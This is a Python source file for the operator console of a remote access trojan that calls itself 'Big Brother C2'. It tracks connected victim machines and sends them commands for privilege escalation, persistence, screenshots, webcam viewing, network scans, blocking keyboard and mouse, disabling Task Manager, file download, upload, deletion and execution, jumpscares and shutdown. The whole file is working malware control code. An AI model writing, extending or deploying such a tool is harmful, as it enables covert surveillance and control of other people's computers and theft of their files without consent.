from multiprocessing.forkserver import ensure_running

from customtkinter import CTk, CTkInputDialog
from tkinter import messagebox, ttk, filedialog
import tkinter
import filetrans
import socket
from dataser import deserialize
import keyboard
import logging
#from RemoteDesktop import RDS
from CamUtils import CameraViewer
import time
import threading
from NetScan import NetworkScannerViewer
from PIL import Image, ImageTk
import psutil
import windows_toasts
import os
import datetime
import ast
import random
import json
from ServiceDialog import ServiceDialog
import ssl
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime
import uuid

logging.basicConfig(format="{asctime} - {levelname} - {message}", datefmt="%Y-%m-%d %H:%M:%S", style="{", level=logging.DEBUG, filename="logs.log", filemode="a", encoding="utf-8")

languages = {"english": "english", "arabic": "arabic"}

with open("assets/English.json", "r", encoding="utf-8") as f:
    english_widgets = f.read()
    print(english_widgets)
    english_widgets = ast.literal_eval(english_widgets)

with open("assets/Arabic.json", "r", encoding="utf-8") as f:
    arabic_widgets = f.read()
    print(arabic_widgets)
    arabic_widgets = ast.literal_eval(arabic_widgets)

available_langs = {
"english": english_widgets,
"arabic": arabic_widgets
}

selected_language = list(languages.keys())[0]

if not os.path.exists("cert.crt"):
    # Generate unique private key
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    # Create unique certificate (self-signed)
    cert = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, f"cert-{uuid.uuid4()}")]))
        .issuer_name(x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, f"cert-{uuid.uuid4()}")]))
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )

    # Save files
    with open("cert.crt", "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

    with open("cert.key", "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))

    messagebox.showinfo(available_langs[selected_language]["ssl_message"][0], available_langs[selected_language]["ssl_message"][1])

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain("cert.crt", "cert.key")
BUFF = 4096
IP = "0.0.0.0"
PORT = 6978
client_sockets = {}
connected_clients = 0
running = False
#rdp_server = RDS()
cam_server = CameraViewer(IP, 7000)
netscanner = NetworkScannerViewer(IP)


#jit(nopython=True(nopython=True)
def save_screenshot(screenshot_bytes):
    try:
        current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        if not os.path.exists(client_folder):
            os.makedirs(client_folder)
        if not os.path.exists(client_folder+'screenshots'):
            os.makedirs(client_folder+"screenshots")

        screenshot_filename = f"{current_time}_screenshot.png"
        screenshot_path = client_folder+"screenshots\\"+screenshot_filename

        with open(screenshot_path, "wb") as screenshot_file:
            screenshot_file.write(screenshot_bytes)
    except Exception as e:
        print(e)
        pass

#jit(nopython=True(nopython=True)
def handle_client(csock:socket.socket):
    global running
    #global data
    global connected_clients
    global client_folder
    toast = windows_toasts.WindowsToaster("Big Brother C2")
    new_toast = windows_toasts.Toast()
    tree.tag_configure("admin", background="#3b0909", foreground="white")
    tree.tag_configure("user", background="#5E6B83")
    cid = random.randint(1000000, 9999999)
    client_sockets[cid] = csock
    info = csock.recv(1024).decode()
    ip, host, _os, version, user, name, hwid = info.split("|")
    if user == "Admin":
        id = tree.insert("", 0, values=(cid, ip, host, _os, version, user, name, hwid), tags=("admin"))
        new_toast.text_fields = [f"Connection From {host} With Admin Privilages"]
        new_toast.attribution_text = f"ip: {ip}\nOS: {_os}"
        #new_toast.on_activated = root.focus()
        toast.show_toast(new_toast)
    else:
        id = tree.insert("", "end", values=(cid, ip, host, _os, version, user, name, hwid), tags=("user"))
        new_toast.text_fields = [f"Connection From {host}"]
        new_toast.attribution_text = f"ip: {ip}\nOS: {_os}"
        #new_toast.on_activated = root.focus()
        toast.show_toast(new_toast)

    client_folder = f"Clients\\{ip}-{host.split("@")[0]}\\"
    try:
        os.makedirs(client_folder)
    except:pass
    
    logging.debug(f"Received standard info from client {csock.getpeername()}:{info}")
    while running:
        try:
            data = csock.recv(BUFF).decode()
            if not data:
                break
            print(data)
            
            if running == False:
                for i in tree.get_children():
                    tree.delete(i)
                csock.close()
    
            if data == "persist_f":
                threading.Thread(target=lambda: messagebox.showerror("Error", "The Agent Was Not Able To Self Persist!")).start()

            if data == "ping successful":
                print("PING SUCCESS!")
                messagebox.showinfo(available_langs[selected_language]["ping"][1], available_langs[selected_language]["ping"][2])

            if data == "schtsk_1":
                messagebox.showinfo("COMMAND SUCCESS", "Created a Schedule Successfully!")
                logging.info("Successfully Created a Schedule")

            if data.startswith("DEV"):
                flag, devs = data.split("@")
                display_devices(devs.split("|"), f"Device Manager | {host}")

            if data.startswith("ERROR"):
                messagebox.showerror("ERROR", data)
                logging.error(data)
            
            if data.startswith("Success"):
                messagebox.showinfo("Success!", data)

            if data == "info_success":
                filetrans.receive_single_file(csock, client_folder)
                filetrans.receive_single_file(csock, client_folder)
                messagebox.showinfo(available_langs[selected_language]["info_success"][0], available_langs[selected_language]["info_success"][1])

            if data == "tasken":
                threading.Thread(target=messagebox.showinfo, args=(available_langs[selected_language]["taskmgr_box"][0], available_langs[selected_language]["taskmgr_box"][2])).start()
            
            if data == "taskdis":
                threading.Thread(target=messagebox.showinfo, args=(available_langs[selected_language]["taskmgr_box"][0], available_langs[selected_language]["taskmgr_box"][1])).start()

            if data == "EscErr":
                messagebox.showerror("ERROR!", "Privilage Escilation failed due to user rejecting")
                logging.error("Privilage Esclation failed due to user rejection")
            
            if data.startswith("Done"):
                messagebox.showinfo("Success", data)

            if data == "ss":
                screenshot_size = int(csock.recv(1024).decode())
                received_data = b""
                while screenshot_size > 0:
                    chunk = csock.recv(min(screenshot_size, 1024))
                    if not chunk:
                        print("finished")
                    received_data += chunk
                    screenshot_size -= len(chunk)
                save_screenshot(received_data)

            if data == "privesc":
                csock.send(b"disconnect")
                tree.delete(id)
                client_sockets.pop(cid)
                logging.info("Privilages has been Escalated! Disconnecting the old connection")
                break

            if data == "admin":
                messagebox.showerror("Error", "Privilages are Already High. No Need for Escalation.")
                logging.error("Privilages are Already High. No Need for Escalation.")

            # keep-alive signals
            #csock.send(b"1")

        except Exception as e:
            #if e == csock.getpeername()[0]:
            #    break
            logging.error(f"Handler Error: {e}")
            print("CONNECTION ERROR")
            csock.close()
            logging.warning(f"Client With Address: {client_sockets[cid]} has Disconnected!")
            logging.info(f"Popped {client_sockets[cid]} with the client id {cid} from the clients dictionary")
            logging.info("deleting the client from the clients list")
            new_toast.text_fields = f"Client {host} Disconnected"
            client_sockets.pop(cid)
            connected_clients -= 1
            logging.info(f"Clients decreased by 1. {connected_clients} Connected")
            tree.delete(id)
            break
        except KeyboardInterrupt:
            break

#jit(nopython=True(nopython=True)
def ping(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send("ping".encode())
    logging.info(f"{tar_sock.getpeername()[0]} pinged.")

#jit(nopython=True(nopython=True)
def send_url(selected_item):
    selected_item = tree.item(selected_item)
    dialog = CTkInputDialog(text="Enter URL", title="Input Dialog").get_input()
    logging.debug(f"Input Entered. value={dialog}")
    print(dialog)
    if not dialog == None:
        ip = selected_item["values"][0]
        tar_sock = client_sockets[ip]
        tar_sock.send(f"url:{dialog}".encode())
        logging.info(f"{dialog} has been sent to be opened in {tar_sock.getpeername()[0]} browser.")
        #dialog.destroy()

#jit(nopython=True(nopython=True)
def monitor_on(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send(b"mon_on")

#jit(nopython=True(nopython=True)
def monitor_off(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send(b"mon_off")

#################################################################

#jit(nopython=True(nopython=True)
def file_explorer(selected_item):
    print(len(selected_item))
    if len(selected_item) > 1:
        messagebox.showerror("Error", "Choose One Client For File Explorer")
        run = False
    else:
        run = True
        selected_item = tree.item(selected_item[0])
        ip = selected_item["values"][0]
        print(ip)
        tar_sock = client_sockets[ip]
        sep = "<SEP>"
        save_dir = client_folder+"received_files"
        file_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        file_socket.bind(("0.0.0.0", 9999))
        file_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tar_sock.send(b"start_file")

    #jit(nopython=True(nopython=True)
    def handle_file_client(sock: socket.socket):
        global fsock
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain("cert.crt", "cert.key")
        from base64 import b64decode
        from filetrans import receive_single_file, send_single_file
        from time import sleep
        try:
            path_entry.bind("<Return>", lambda x: fsock.send(f"dir:{path_entry.get().lower()}".encode()))
            file_tree.bind("<Double-Button-1>", lambda x: move_to_dir(x, fsock))
            file_tree.bind("<Button-3>", lambda x: context_menu(x, fsock))
            #path_entry.insert(0, "home")
            sock.listen(1)
            fsock, caddr = sock.accept()
            fsock = context.wrap_socket(fsock, server_side=True, do_handshake_on_connect=True)
            keyboard.add_hotkey("alt+left", lambda: back(fsock))
            list_drives(fsock)
            fsock.send("dir:home".encode())
            while True:
                data = fsock.recv(1024)
                try:
                    if not data:
                        print("Error: client Disconnected")
                        break

                    if data.decode() == "DIR":
                        try:
                            # Read exact size first
                            size = int(fsock.recv(64).decode().strip())
                            path = fsock.recv(200).decode()
                            path_entry.insert(0, path)

                            received = b""
                            while len(received) < size:
                                chunk = fsock.recv(min(4096, size - len(received)))
                                if not chunk:
                                    break
                                received += chunk
                            
                            dir_data = deserialize(b64decode(received).decode())
                            #print(file_tree.get_children())
                            for i in file_tree.get_children():
                                file_tree.delete(i)
                            #b64_data = None

                            dir_data = b64decode(received).decode()
                            print(dir_data)
                            dir_data = deserialize(dir_data)
                            print(dir_data)
                            files_list = []
                            folders_list = []
                            for i in list(dir_data.keys()):
                                if dir_data[i][2] == "True":
                                    folders_list.append(("📁 "+i, dir_data[i][0], "<DIR>", dir_data[i][2]))
                                    #file_tree.insert("", 0, values=("📁 "+i, dir_data[i][0], "<DIR>", dir_data[i][2]), tags=("dir"))
                                else:
                                    files_list.append(("📄 "+i, dir_data[i][0], round(int(dir_data[i][1]) / 1024 / 1024, 2), dir_data[i][2]))
                                    #file_tree.insert("", "end", values=("📄 "+i, dir_data[i][0], round(int(dir_data[i][1]) / 1024 / 1024, 2), dir_data[i][2]), tags=("file"))
                            print(folders_list)
                            for i in folders_list:
                                file_tree.insert("", "end", values=i, tags=("dir"))

                            for i in files_list:
                                file_tree.insert("", "end", values=i, tags=("file"))

                                #file_tree.insert("", 0, values=("..", "BACK", "", ""))
                        except Exception as e:
                                print(f"Dir Error: {e}")
                        finally: transfer = False

                    if data.decode().startswith("Error"):
                        messagebox.showerror("ERROR", data.decode())

                    if data.decode() == "receive":
                        receive_single_file(fsock, save_dir=client_folder)
                        messagebox.showinfo("Success", "File Downloaded Successfully!\nyou will find the file in your client directory/folder")

                    if data.decode() == "exec_success":
                        messagebox.showinfo("Success", "File Has been Executed Successfully")

                    if data.decode() == "down_success":
                        messagebox.showinfo("SUCCESS", "Downloading the Selected Sile is Successful")            
                    if data.decode() == "shutdown":
                        break
                except Exception as e:
                    print(f"Handler Error: {e}")
                    break
        except Exception as e:
            print("Client Forcibly Disconnected\n")
            file_socket.send(b"close")
            print(e)

    #jit(nopython=True(nopython=True)
    def move_to_dir(event, csock: socket.socket):
        selected_index = file_tree.identify_row(event.y)
        selected_item = file_tree.item(selected_index)
        print(selected_item["values"])
        is_dir = selected_item["values"][3]
        if is_dir == "True":
            csock.sendall(f"dir:{selected_item['values'][1]}".encode())
            path_entry.delete(0, "end")
            #path_entry.insert(0, selected_item["values"][1])
        else:
            pass
    
    #jit(nopython=True(nopython=True)
    def back(csock: socket.socket):
        new_path = ""
        old_path = path_entry.get()
        for i in old_path.split("\\")[0:-1]:
            new_path = new_path+f"{i}\\"
        path_entry.delete(0, tkinter.END)
        if not new_path.endswith("\\"):
            csock.send(f"dir:{new_path}".encode())
        else:
            csock.send(f"dir:{new_path[0:-1]}".encode())

    #jit(nopython=True(nopython=True)
    def list_drives(csock: socket.socket):
        csock.send(b"drives")
        data = csock.recv(1024)
        if data.decode().startswith("drive"):
            print(data.decode())
            print(data.decode().split("|")[1].split('\\')[0:-1])
            drives_list = data.decode().split("|")[1].split('\\')[0:-1]
            print(drives_list)
            drives_menu.configure(values=drives_list, state="readonly", textvariable=text_variable)
    
    #jit(nopython=True(nopython=True)
    def upload(csock):
        path = path_entry.get()
        file = filedialog.askopenfilename()
        csock.send(f"upload:{path}".encode())
        filetrans.send_single_file(csock , file)

    #jit(nopython=True(nopython=True)
    def download(selected_item, csock):
        path = selected_item["values"][1]
        is_dir = selected_item["values"][3]
        if is_dir == "False":
            print(is_dir)
            print(type(is_dir))
            csock.send(f"file_down:{path}".encode())
        else:
            print("Error")

    #jit(nopython=True(nopython=True)
    def execute(selected_item, csock):
        path = selected_item["values"][1]
        is_dir = selected_item["values"][3]
        if is_dir == "False":
            csock.send(f"execute:{path}".encode())
        else:pass

    #jit(nopython=True(nopython=True)
    def home(csock):
        csock.send("dir:home".encode())
        path_entry.delete(0, "end")
        
    def delete(csock, selected_index):
        selected_item = file_tree.item(selected_index)
        csock.send(f"del:{selected_item["values"][1]}".encode())
        file_tree.delete(selected_index)

    def select_disk(csock):
        path_entry.delete(0, tkinter.END)
        #path_entry.insert(0, drives_menu.get())
        print(drives_menu.get())
        print(len(drives_menu.get()[1:2]))
        if drives_menu.get() != "C:":
            csock.send(f"dir:{drives_menu.get()[1:2]}:\\".encode())
        elif drives_menu.get() == "C:":
            csock.send(f"dir:{drives_menu.get()}\\".encode())

    #jit(nopython=True(nopython=True)
    def context_menu(event, csock):
        selected_index = file_tree.identify_row(event.y)
        selected_item = file_tree.item(selected_index)

        main_menu = tkinter.Menu(window, tearoff=0)
        
        main_menu.add_command(label=f"{available_langs[selected_language]['moveto']}", command=lambda: move_to_dir(event, csock), background="black", foreground="white")
        main_menu.add_command(label=f"{available_langs[selected_language]['down']}", command=lambda: download(selected_item, csock), background="black", foreground="white")
        main_menu.add_command(label=f"{available_langs[selected_language]['del']}", command=lambda: delete(csock, selected_index), background="black", foreground="white")
        main_menu.add_command(label=f"{available_langs[selected_language]['up']}", command=lambda: upload(csock), background="black", foreground="white")
        main_menu.add_command(label=f"{available_langs[selected_language]['step']}", command=lambda: back(csock), background="black", foreground="white")
        main_menu.add_separator(background="black")
        main_menu.add_command(label=f"{available_langs[selected_language]['exec']}", command=lambda: execute(selected_item, csock), background="black", foreground="white")

        main_menu.post(event.x_root, event.y_root)


    def on_quit():
        try:
            send_command(fsock, "close")
            file_socket.close()
            print("File Socket Closed")
        except Exception as e:
            print(f"File Explorer Quit Error: {e}")
        finally:
            window.destroy()

    if run == False:
        pass
    if run == True:
        window = tkinter.Toplevel(root)
        window.geometry("900x570")
        window.resizable(False, False)
        text_variable = tkinter.StringVar(window, value="C:")

        file_icon = Image.open("assets/file_explorer/file.png")
        file_icon = file_icon.resize((20, 20))
        file_icon = ImageTk.PhotoImage(file_icon)

        back_icon = Image.open("assets/file_explorer/arrow.png")
        back_icon = back_icon.rotate(90)
        back_icon = back_icon.resize((32, 32))
        back_icon = ImageTk.PhotoImage(back_icon)
        
        dir_icon = Image.open("assets/file_explorer/dir.png")
        dir_icon = dir_icon.resize((20, 20))
        dir_icon = ImageTk.PhotoImage(dir_icon)

        input_field = tkinter.Frame(window, background="black")
        input_field.pack(fill="x", side="top")

        drives_menu = ttk.Combobox(input_field, textvariable=text_variable, state="disabled", width=3)
        drives_menu.bind("<<ComboboxSelected>>", lambda x: select_disk(fsock))
        drives_menu.pack(side="left", padx=10)

        home_button = ttk.Button(input_field, text=f"{available_langs[selected_language]["home"]}", command=lambda: home(fsock))
        home_button.pack(side="left", padx=5, pady=5)

        back_button = ttk.Button(input_field, image=back_icon, compound="left", text=f"{available_langs[selected_language]["back"]}")
        back_button.pack(side="left", padx=10, pady=5)
        back_button.bind("<Button-1>", lambda x: back(fsock))

        path_entry = ttk.Entry(input_field, width=900)
        #path_entry.insert(0, "C:\\Users\\HERO\\")
        path_entry.pack(fill="x", side="left", padx=10)

        scroll_bar = tkinter.Scrollbar(window, orient="vertical")
        scroll_bar.pack(side="right", fill="y")

        file_tree = ttk.Treeview(window, columns=("name", "path", "size", "isdir"), show="headings")
        file_tree.pack(fill="both", expand=True)

        file_tree.configure(yscrollcommand=scroll_bar.set)
        scroll_bar.configure(command=file_tree.yview)

        file_tree.heading("name", text=f"{available_langs[selected_language]['columns'][0]}")
        file_tree.heading("path", text=f"{available_langs[selected_language]['columns'][1]}")
        file_tree.heading("size", text=f"{available_langs[selected_language]['columns'][2]}")
        file_tree.heading("isdir", text=f"{available_langs[selected_language]['columns'][3]}")

        style.configure("Treeview", rowheight=25, background="black", foreground="white")

        #tree.column("#0", width=2, anchor="e")
        file_tree.column("name", width=100)
        file_tree.column("path", width=200)
        file_tree.column("isdir", width=20)
        file_tree.column("size", width=30)
        file_tree.tag_configure("dir", background="#2d2f97", font=("Segoe UI Emoji", 12))
        file_tree.tag_configure("file", background="#718eeb", font=("Segoe UI Emoji", 12))
        window.protocol("WM_DELETE_WINDOW", on_quit)
        window.focus()
        window.title(f"{available_langs[selected_language]['title']}: {selected_item["values"][2]}")
        threading.Thread(target=lambda: handle_file_client(file_socket)).start()

################################################################################

#jit(nopython=True(nopython=True)
def jumpscare(selected_item):
        selected_item = tree.item(selected_item)
        ip = selected_item["values"][0]
        tar_sock = client_sockets[ip]
        messagebox.showwarning(available_langs[selected_language]["jumpscare_popup"][0], available_langs[selected_language]["jumpscare_popup"][1])
        def select_image():
            global image
            image_name = filedialog.askopenfilename()
            image_label.configure(text=image_name)
            image = image_name

        def select_sound():
            global sound
            sound_name = filedialog.askopenfilename()
            sound_label.configure(text=sound_name)
            sound = sound_name

        def submit():
            tar_sock.sendall(f"jumpscare|{os.path.basename(image)}|{os.path.basename(sound)}".encode())
            filetrans.send_single_file(tar_sock, image)
            filetrans.send_single_file(tar_sock, sound)
            root1.destroy()

        root1 = tkinter.Toplevel(root)
        root1.lift()
        root1.grab_set()
        root1.title(available_langs[selected_language]["jumpscare_menu"][0])
        root1.resizable(False, False)
        root1.geometry("550x250")

        frame = tkinter.Frame(root1, background="black")
        frame.pack(fill="both", expand=True)

        img_file = ttk.Button(frame, text=f"{available_langs[selected_language]['jumpscare_menu'][1]}", command=select_image)
        sound_file = ttk.Button(frame, text=f"{available_langs[selected_language]['jumpscare_menu'][2]}", command=select_sound)
        img_file.place(x=30, y=30)
        sound_file.place(y=100, x=30)

        image_label = tkinter.Label(frame, background="black", foreground="white")
        image_label.place(x=30, y=65)

        sound_label = tkinter.Label(frame, text="", background="black", foreground="white")
        sound_label.place(y=130, x=30)

        submit_btn = ttk.Button(frame, text=f"{available_langs[selected_language]["jumpscare_menu"][3]}", command=submit)
        submit_btn.place(y=190, x=230)

#jit(nopython=True(nopython=True)
def retrive_all_info(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send(b"info")
    threading.Thread(target= lambda: [messagebox.showinfo(available_langs[selected_language]["info_message"][0], available_langs[selected_language]["info_message"][1])]).start()
#jit(nopython=True(nopython=True)
def persistance(selected_item):
    selected_item = tree.item(selected_item)
    dialog = ServiceDialog(root).get_value()
    print(dialog)
    if not dialog == None:
        logging.info(f"Persistance Options has been set: {dialog}")
        ip = selected_item["values"][0]
        tar_sock = client_sockets[ip]
        send_command(tar_sock, "PSTANT|"+dialog)
    else:pass

#jit(nopython=True(nopython=True)
def display_devices(devs: list, title):
    window = tkinter.Toplevel(root)
    window.title(title)

    dev_tree = ttk.Treeview(window, columns=("name", "type", "stat"), show="headings")
    dev_tree.pack(fill="both", expand=True)

    dev_tree.heading("name", text="Name", anchor="w")
    dev_tree.heading("type", text="Type", anchor="w")
    dev_tree.heading("stat", text="Status", anchor="w")

    dev_tree.column("name", anchor="w")
    dev_tree.column("type", anchor="w")
    dev_tree.column("stat", anchor="w")

    for i in devs:
        name, _type, stat = i.split(":")
        if not stat == "Error":
            dev_tree.insert("", "end", values=(name, _type, stat))
        if stat == "Error":
            dev_tree.insert("", "end", values=(name, _type, "Disabled"))

#jit(nopython=True(nopython=True)
def start_rdp(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send(b"start_rdp")
    rdp_server.start()

#jit(nopython=True(nopython=True)
def start_cam(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send(b"start_cam")
    cam_server.start()

def show_services(selected_item):
    selected_item = tree.item(selected_item)

#jit(nopython=True(nopython=True)
def PrivEsc(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    send_command(tar_sock, "privesc")
    logging.info("Requesting Privilage Escalation...")

#jit(nopython=True(nopython=True)
def disable_kb(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    send_command(tar_sock, "block_input")
    logging.info("Command sent to disable the input (mouse and keyboard)")

#jit(nopython=True(nopython=True)
def enable_kb(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    send_command(tar_sock, "unblock_input")
    logging.info("Command sent to enable the input (mouse and keyboard)")

#jit(nopython=True(nopython=True)
def play_sound(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    file = filedialog.askopenfilename(initialdir="assets/Sounds")
    if not file == "":
        tar_sock.send(f"sound:{os.path.basename(file)}".encode())
        filetrans.send_single_file(tar_sock, file)

#jit(nopython=True(nopython=True)
def get_devices(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send("get_devs".encode())

#jit(nopython=True(nopython=True)
def change_wp(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    picture = filedialog.askopenfilename()
    if not picture == "":
        send_command(tar_sock, f"wallpaper|{os.path.basename(picture)}")
        filetrans.send_single_file(tar_sock, picture)

def show_netscan(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send(b"start_net")
    netscanner.start()

#jit(nopython=True(nopython=True)
def disable_tskmgr(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    if selected_item["values"][5] == "User":
        messagebox.showerror(available_langs[selected_language]["permerr_message"][0], available_langs[selected_language]["permerr_message"][1])
    tar_sock = client_sockets[ip]
    send_command(tar_sock, "tskmgr_dis")

#jit(nopython=True(nopython=True)
def enable_tskmgr(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    if selected_item["values"][5] == "User":
        messagebox.showerror(available_langs[selected_language]["permerr_message"][0], available_langs[selected_language]["permerr_message"][1])
    tar_sock = client_sockets[ip]
    send_command(tar_sock, "tskmgr_en")

def disconnect(selected_item):
    print(selected_item)
    for i in selected_item:
        print(i)
        selected_index = i
        print(selected_index)
        selected_items = tree.item(i)
        ip = selected_items["values"][0]
        tar_sock = client_sockets[ip]
        tree.delete(selected_index)
        client_sockets.pop(ip)
        tar_sock.send(b"disconnect")
        tar_sock.close()
        logging.info(f"Disconnected from {ip}")

def shutdown(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    send_command(tar_sock, "shutdown")

def screenshot(selected_item):
    selected_item = tree.item(selected_item)
    ip = selected_item["values"][0]
    tar_sock = client_sockets[ip]
    tar_sock.send("ss".encode())
    logging.info("Taking a screenshot")

def context_menu(event):
    #selected_index = tree.identify_row(event.y)
    #selected_item = tree.item(selected_index)
    selected_item = tree.selection()

    monitor_menu = tkinter.Menu(root, tearoff=0, font=("", 10))
    monitor_menu.add_command(label=f"{available_langs[selected_language]['monitor'][1]}", image=off_icon, compound="left", command=lambda: [monitor_off(i) for i in selected_item], background="black", foreground="white")
    monitor_menu.add_command(label=f"{available_langs[selected_language]["monitor"][2]}", image=on_icon, compound="left", command=lambda: [monitor_on(i) for i in selected_item], background="black", foreground="white")

    power_menu = tkinter.Menu(root, tearoff=0, font=("", 10))
    power_menu.add_command(label=f"{available_langs[selected_language]['power'][1]}", image=poweroff_icon, compound="left", command=lambda: [shutdown(i) for i in selected_item], background="black", foreground="white")
    power_menu.add_command(label=f"{available_langs[selected_language]['power'][2]}", image=restart_icon, compound="left", background="black", foreground="white")
    power_menu.add_command(label=f"{available_langs[selected_language]['power'][3]}", image=logout_icon, compound="left", background="black", foreground="white")

    keyboard_menu = tkinter.Menu(root, tearoff=0)
    keyboard_menu.add_command(label=f"{available_langs[selected_language]['k&m'][1]}", image=off_icon, compound="left", command=lambda: [disable_kb(i) for i in selected_item], background="black", foreground="white")
    keyboard_menu.add_command(label=f"{available_langs[selected_language]['k&m'][2]}", image=on_icon, compound="left", command=lambda: [enable_kb(i) for i in selected_item], background="black", foreground="white")

    tskmgr_menu = tkinter.Menu(root, tearoff=0)
    tskmgr_menu.add_command(label=f"{available_langs[selected_language]['taskmgr'][1]}", image=off_icon, compound="left", command=lambda: [disable_tskmgr(i) for i in selected_item], background="black", foreground="white")
    tskmgr_menu.add_command(label=f"{available_langs[selected_language]['taskmgr'][2]}", image=on_icon, compound="left", command=lambda: [enable_tskmgr(i) for i in selected_item], background="black", foreground="white")

    menu = tkinter.Menu(root, tearoff=0, font=("", 10))
    menu.add_command(label=f"{available_langs[selected_language]['ping'][0]}", image=ping_icon, compound="left", command=lambda: [ping(i) for i in selected_item], background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['url']}", image=url_icon, compound="left", command=lambda: [send_url(i) for i in selected_item], background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['privesc']}",image=admin_icon, compound="left", command=lambda: [PrivEsc(i) for i in selected_item], background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['task_sched']}", image=persist_icon, compound="left", command=lambda: [persistance(i) for i in selected_item], background="black", foreground="white")
    menu.add_cascade(label=f"{available_langs[selected_language]['k&m'][0]}", menu=keyboard_menu, image=keyboard_icon, compound="left", background="black", foreground="white")
    menu.add_cascade(label=f"{available_langs[selected_language]['monitor'][0]}", menu=monitor_menu, compound="left", image=monitor_icon, background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['chwall']}", image=wallpaper_icon, compound="left", command=lambda: [change_wp(i) for i in selected_item], background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['sound'][0]}", command=lambda: [play_sound(i) for i in selected_item], image=music_icon, compound="left", background="black", foreground="white")
    menu.add_cascade(label=f"{available_langs[selected_language]['taskmgr'][0]}", menu=tskmgr_menu, image=tskmgr_icon, compound="left", background="black", foreground="white")
    #menu.add_command(label=f"{available_langs[selected_language]['RD']}", image=rdp_icon, compound="left", command=lambda: [start_rdp(i) for i in selected_item], background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]["RC"]}", image=webcam_icon, compound="left", command=lambda: [start_cam(i) for i in selected_item], background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]["NetScan"]}", command=lambda: [show_netscan(i) for i in selected_item], image=net_icon, compound="left", background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['jumpscare'][0]}", command=lambda: [jumpscare(i) for i in selected_item], image=skull_icon, compound="left", background="black", foreground="white")
    #menu.add_command(label="Device Manager", command=lambda: [get_devices(i) for i in selected_item])
    menu.add_command(label=f"{available_langs[selected_language]['explorer']}", image=file_icon, compound="left", command=lambda: threading.Thread(target=lambda: file_explorer(selected_item)).start(), background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['ss']}", command=lambda: [screenshot(i) for i in selected_item], image=camera_icon, compound="left", background="black", foreground="white")
    menu.add_command(label=f"{available_langs[selected_language]['sysinfo']}", command=lambda: [retrive_all_info(i) for i in selected_item], image=arrow_icon, compound="left", background="black", foreground="white")
    menu.add_separator(background="black")
    menu.add_cascade(label=f"{available_langs[selected_language]['power'][0]}", menu=power_menu, image=power_icon, compound="left", background="black", foreground="white")
    menu.add_separator(background="black")
    menu.add_command(label=f"{available_langs[selected_language]['discon']}", image=disconnect_icon, compound="left", command=lambda: disconnect(selected_item), background="black", foreground="white")

    menu.post(event.x_root, event.y_root)
    print(tree.selection())
    logging.debug(f"Context Menu Posted at: x={event.x_root}, y={event.y_root}")

def send_command(csock: socket.socket, command: str):
    csock.sendall(command.encode())
    logging.info(f"command {command} has been sent successfully")

#jit(nopython=True(nopython=True)
def start_server(ip, port):
    global server_socket
    global running
    global connected_clients
    running = True
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    logging.debug("TCP Socket object has been created successfully")
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    logging.debug("Socket Option REUSEADDR has been Activated")
    server_socket.bind((ip, port))
    logging.debug(f"Socet bind with address {ip, port}")
    server_socket.listen()
    logging.info(f"Server Started on Address {ip}:{port}")
    listen_button.configure(text=f"{available_langs[selected_language]["listen_button_clicked"]}", command=None)
